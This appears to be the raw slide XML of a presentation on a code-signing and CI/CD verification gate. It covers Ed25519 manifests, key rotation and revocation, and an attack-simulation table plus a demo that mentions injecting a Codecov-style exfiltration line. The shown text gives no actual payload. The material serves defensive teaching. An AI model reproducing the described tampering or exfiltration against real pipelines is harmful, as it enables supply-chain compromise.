              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Protects the download in transit. Cannot prove the file on the server is genuine.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Picture 16" descr="crypto_flow.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="3200400"/>
            <a:ext cx="8412480" cy="1990049"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Rounded Rectangle 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5349240"/>
            <a:ext cx="8412480" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F4F6F9"/>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5376672"/>
            <a:ext cx="8229600" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>json.dumps({k: v for k, v in manifest.items() if k != "signature"},</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>           sort_keys=True, separators=(",", ":"))  →  priv_key.sign(...)  →  Base64 "signature"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Key Management &amp; Revocation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="key_lifecycle.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="8412480" cy="1582546"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="3154680"/>
            <a:ext cx="2697480"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322783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Generation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="3584448"/>
            <a:ext cx="2514600" cy="91440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Ed25519 from OS CSPRNG · key_id + SHA-256 fingerprint</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="3154680"/>
            <a:ext cx="2697480"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10128" y="322783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Protection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3584448"/>
            <a:ext cx="2514600" cy="91440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PKCS#8 PEM, optional passphrase → HSM / cloud KMS in production</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rounded Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="3154680"/>
            <a:ext cx="2697480"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4768" y="322783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Distribution</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="3584448"/>
            <a:ext cx="2514600" cy="91440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Public key in trusted keystore; key_id in allowed_key_ids</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Rounded Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4663440"/>
            <a:ext cx="2697480"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 y="473659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Rotation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="5093207"/>
            <a:ext cx="2514600" cy="91440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rotate_key(): new key generated, old key moved to the CRL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Rounded Rectangle 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="4663440"/>
            <a:ext cx="2697480"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10128" y="473659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Revocation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="TextBox 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="5093207"/>
            <a:ext cx="2514600" cy="91440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revoked_keys.json: key_id, reason, time → REVOKED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rounded Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="4663440"/>
            <a:ext cx="2697480"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44768" y="473659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Two-sided</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="5093207"/>
            <a:ext cx="2514600" cy="91440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sign.py refuses revoked keys; verify.py rejects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Verification Engine &amp; CI/CD Gate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="verification_pipeline.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="8412480" cy="1187905"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Table 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="2743200"/>
          <a:ext cx="8412480" cy="2880360"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="685800"/>
                <a:gridCol w="5257800"/>
                <a:gridCol w="2468880"/>
              </a:tblGrid>
              <a:tr h="411480">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Stage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50" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Check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50" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Blocks with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411480">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>1</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Manifest schema; SHA-256 + Ed25519 only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INVALID_MANIFEST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411480">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>2</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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Key not in keys/revoked_keys.json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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>REVOKED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411480">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3</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Trusted signer, allowed key ID, revoked/min version, approved repo, tests passed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UNAUTHORIZED_KEY / BLOCKED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411480">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>4</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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Trusted public key + Ed25519 signature over canonical manifest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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>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411480">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>5</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Recomputed SHA-256 == manifest.sha256</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HASH_MISMATCH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411480">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>6</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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Provenance artifact_sha256 == verified digest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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>PROVENANCE_MISMATCH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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5806440"/>
            <a:ext cx="8412480" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python ci/security_gate.py --artifact A --manifest A.manifest.json  →  exit 0 DEPLOY · exit 1 BLOCK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Attack Simulation &amp; Live Demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="1371600"/>
          <a:ext cx="5623560" cy="4114800"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="685800"/>
                <a:gridCol w="2880360"/>
                <a:gridCol w="2057400"/>
              </a:tblGrid>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Scenario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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Attacker action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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Gate result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457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>1</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Legitimate release v1.0.0</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1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>DEPLOY · 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457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>2</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Codecov-style line appended after signing</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 · HASH_MISMATCH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457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3A</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Signs with own rogue key / fake signer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 · UNAUTHORIZED_KEY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457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3B</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Uses a leaked, revoked vendor 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 · REVOKED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457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>4</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Replays blacklisted version 0.8.0</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 · revoked version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457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a: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Edits manifest without re-signing</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 · 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457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a: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Signature bytes corrupted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 · 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457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>9</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New release v1.0.1 with rotated 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1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>DEPLOY · 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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1371600"/>
            <a:ext cx="2606040" cy="41148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81928" y="1426464"/>
            <a:ext cx="2423160" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>14-step live demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="1783080"/>
            <a:ext cx="2423160" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1. Explain Codecov attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2. Show architecture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3. Show legitimate uploader</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4. SHA-256 digest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5. Ed25519 signature</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>6. Verify → PASS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>7. Inject exfiltration line</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>8. Verify again</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>9. SHA-256 mismatch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>10. HASH_MISMATCH alert</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>11. Gate BLOCKS (exit 1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>12. Audit log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>13. Key revocation (CRL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="100"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>14. Restore → PASS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="5074920"/>
            <a:ext cx="2423160" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python demo.py -i</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rounded Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5669280"/>
            <a:ext cx="8412480" cy="50292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5687568"/>
            <a:ext cx="8229600" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Safe: runs locally on artifacts/ · payload targets 127.0.0.1 only · tampered script is never executed · original restored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Testing Results</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760"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65760" y="1481328"/>
            <a:ext cx="1984248" cy="754380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
